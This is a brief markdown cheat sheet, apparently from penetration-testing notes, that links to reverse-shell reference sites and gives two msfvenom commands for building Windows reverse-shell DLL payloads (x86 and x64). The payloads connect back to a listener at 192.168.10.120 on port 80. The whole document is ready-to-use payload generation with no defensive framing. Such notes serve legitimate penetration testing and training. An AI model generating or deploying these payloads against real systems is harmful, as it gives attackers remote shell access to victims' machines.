#### Reference resources

https://www.revshells.com/

https://book.hacktricks.xyz/shells/shells/msfvenom

### :open_file_folder: Windows

x86

```
msfvenom -p windows/shell_reverse_tcp -f dll -o xxx.dll LHOST=192.168.10.120 LPORT=80
```

x64

```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o xxx.dll LHOST=192.168.10.120 LPORT=80
```
